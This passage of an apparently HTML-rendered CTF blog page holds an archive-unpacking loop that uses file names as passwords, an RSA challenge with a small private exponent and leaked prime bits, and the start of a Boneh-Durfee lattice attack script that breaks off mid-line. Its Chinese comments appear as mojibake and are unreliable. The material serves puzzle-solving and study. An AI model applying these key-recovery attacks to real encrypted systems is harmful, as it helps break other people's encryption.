class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rarfile</span><br><span class="line"></span><br><span class="line"><span class="comment">#a = py7zr.SevenZipFile(r&#x27;e:\test.7z&#x27;,&#x27;r&#x27;)</span></span><br><span class="line"></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># now = &quot;/var/www/html/check/10621.7z&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  path=<span class="string">&quot;/var/www/html/check/&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  file = os.listdir(path)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">Â  Â  zfilefile = path+file</span><br><span class="line"></span><br><span class="line">Â  Â  s = file.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#print(zfilefile)</span></span><br><span class="line"></span><br><span class="line">Â  Â  pwds= s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#print(file)</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] == <span class="string">&quot;7z&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">with</span> py7zr.SevenZipFile(zfilefile, mode=<span class="string">&#x27;r&#x27;</span>, password=pwds) <span class="keyword">as</span> z:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  z.extractall(path=<span class="string">&#x27;/var/www/html/check/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  z.close()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] == <span class="string">&quot;zip&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">with</span> zipfile.ZipFile(zfilefile,mode=<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  f.extractall(<span class="string">&quot;/var/www/html/check/&quot;</span>,pwd=pwds.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  f.close()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(file)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># zpf= zipfile.ZipFile(zfilefile)</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># list = zpf.namelist() Â # å¾—åˆ°å‹ç¼©åŒ…é‡Œæ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># for f in list:</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># Â  Â  zpf.extract(f, &quot;zip&quot;, pwd=pwds.encode(&#x27;utf-8&#x27;)) Â # å¾ªç¯è§£å‹æ–‡ä»¶åˆ°æŒ‡å®šç›®å½•ï¼Œå¯†ç </span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># print(&quot;è§£å‹æˆåŠŸ&quot;)</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] Â == <span class="string">&quot;rar&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="function"><span class="keyword">def</span> <span class="title">unrar_file_with_password</span>(<span class="params">file_path, output_path, password</span>):</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># åˆ›å»ºRARFileå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar = rarfile.RarFile(file_path)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># è®¾ç½®å¯†ç </span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar.setpassword(password)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># è§£å‹RARæ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar.extractall(output_path)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># å…³é—­RARFileå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar.close()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  path1 = <span class="string">&quot;/var/www/html/check/&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># è°ƒç”¨å‡½æ•°è§£å‹å¸¦å¯†ç çš„RARæ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  unrar_file_with_password(zfilefile, path1, pwds)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># print(&quot;a&quot;)</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] != <span class="string">&quot;rar&quot;</span> Â <span class="keyword">and</span> s[<span class="number">1</span>] != <span class="string">&quot;zip&quot;</span> <span class="keyword">and</span> Â s[<span class="number">1</span>] != <span class="string">&quot;7z&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># rf = rarfile.RarFile(zfilefile) Â # å¾…è§£å‹æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># path2 =&quot;/var/www/html/check/&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># print(rf)</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># rf.extractall(path = path2, pwd=&quot;39193&quot;) Â # è§£å‹æŒ‡å®šæ–‡ä»¶è·¯å¾„</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># rf.close()</span></span><br></pre></td></tr></table></figure><h5 id="bd"><a href="#bd" class="headerlink" title="bd"></a>bd</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/mumuhhh/p/17789591.html</span><br><span class="line">https://blog.csdn.net/Ahi0upsec/article/details/132717024</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">d = getPrime(<span class="number">299</span>)</span><br><span class="line">e = inverse(d,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">hint1 = p &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line">hint2 = q &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint1 = <span class="subst">&#123;hint1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint2 = <span class="subst">&#123;hint2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># n = 64421669931279763032337930351371074312763623230334264672272991963587968145469789623226631192910548697947848779021944177739911084383786634595255436873350170397825307930618697902052402139072111389681839113510986333829074390665317265603346122882832568330112945567680656219994967593371244275156478322204419261819</span></span><br><span class="line"><span class="comment"># e = 31010691142874094705557092175690153458422282630834301371323563655985170293061551914791533335820551677589839843761852199680128997193432075880230502409814741638209947794142932041357373199521605405986705517942961028228255066560857365694517578822510622110740926010357756915595155038827023753366174321207668419113</span></span><br><span class="line"><span class="comment"># c = 44228757856694834445202355486356318880471120936109992694489050154150768403667631244534149277159399976972028214341072460353357561691320731420869678207365539080035139895735181119706727564445399237943178679966032596522818504363414526390960660239215638736706163678206959509331192083842100728618312517781111784803</span></span><br><span class="line"><span class="comment"># hint1 = 597218086872775768003</span></span><br><span class="line"><span class="comment"># hint2 = 836339982627318976124</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.clock = time.time</span><br><span class="line"> </span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># å¦‚æœæ™¶æ ¼è¾¾åˆ°è¯¥å°ºå¯¸ï¼Œåˆ™åœæ­¢ç§»é™¤</span></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºæœ‰ç”¨çŸ¢é‡çš„ç»Ÿè®¡æ•°æ®</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#print (nothelpful, &quot;/&quot;, BB.dimensions()[0], &quot; vectors are not helpful&quot;)</span></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºå¸¦æœ‰ 0 å’Œ X çš„çŸ©é˜µ</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span>(<span class="params">BB, bound</span>):</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>: </span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="comment">#print (a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°è¯•åˆ é™¤æ— ç”¨çš„å‘é‡</span></span><br><span class="line"><span class="comment"># ä»å½“å‰ = n-1ï¼ˆæœ€åä¸€ä¸ªå‘é‡ï¼‰å¼€å§‹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span></span><br><span class="line">    <span class="comment"># æˆ‘ä»¬ä»å½“å‰ = n-1ï¼ˆæœ€åä¸€ä¸ªå‘é‡ï¼‰å¼€å§‹</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># å¼€å§‹ä»åé¢æ£€æŸ¥</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#  å¦‚æœå®ƒæ²¡æœ‰ç”¨</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">             <span class="comment"># è®©æˆ‘ä»¬æ£€æŸ¥å®ƒæ˜¯å¦å½±å“å…¶ä»–å‘é‡</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># å¦‚æœå¦ä¸€ä¸ªå‘é‡å—åˆ°å½±å“ï¼š</span></span><br><span class="line">                <span class="comment"># æˆ‘ä»¬å¢åŠ è®¡æ•°</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># ç­‰çº§ï¼š0</span></span><br><span class="line">            <span class="comment"># å¦‚æœæ²¡æœ‰å…¶ä»–è½½ä½“æœ€ç»ˆå—åˆ°å½±å“</span></span><br><span class="line">            <span class="comment"># æˆ‘ä»¬åˆ é™¤å®ƒ</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;* removing unhelpful vector&quot;, ii)</span></span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">           <span class="comment"># ç­‰çº§ï¼š1</span></span><br><span class="line">            <span class="comment">#å¦‚æœåªæœ‰ä¸€ä¸ªå—åˆ°å½±å“ï¼Œæˆ‘ä»¬ä¼šæ£€æŸ¥</span></span><br><span class="line">            <span class="comment"># å¦‚æœå®ƒæ­£åœ¨å½±å“åˆ«çš„å‘é‡</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># å¦‚æœå®ƒå½±å“å“ªæ€•ä¸€ä¸ªå‘é‡</span></span><br><span class="line">                    <span class="comment"># æˆ‘ä»¬æ”¾å¼ƒè¿™ä¸ª</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># å¦‚æœæ²¡æœ‰å…¶ä»–å‘é‡å—åˆ°å½±å“ï¼Œåˆ™å°†å…¶åˆ é™¤ï¼Œå¹¶ä¸”</span></span><br><span class="line">                <span class="comment"># è¿™ä¸ªæœ‰ç”¨çš„å‘é‡ä¸å¤Ÿæœ‰ç”¨</span></span><br><span class="line">                <span class="comment">#ä¸æˆ‘ä»¬æ— ç”¨çš„ç›¸æ¯”</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="comment">#print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span></span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1ï¼Œ-1 å¦‚æœ &quot;strict=true&quot;ï¼Œå¹¶ä¸”è¡Œåˆ—å¼ä¸å—çº¦æŸ</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> åœ¨ä»¥ä¸‹æƒ…å†µä¸‹æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼š</span></span><br><span class="line"><span class="string">* d &lt; N^delta</span></span><br><span class="line"><span class="string">* |x|&lt; e^delta</span></span><br><span class="line"><span class="string">* |y|&lt; e^0.5</span></span><br><span class="line"><span class="string">æ¯å½“ delta &lt; 1 - sqrtï¼ˆ2ï¼‰/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)   <span 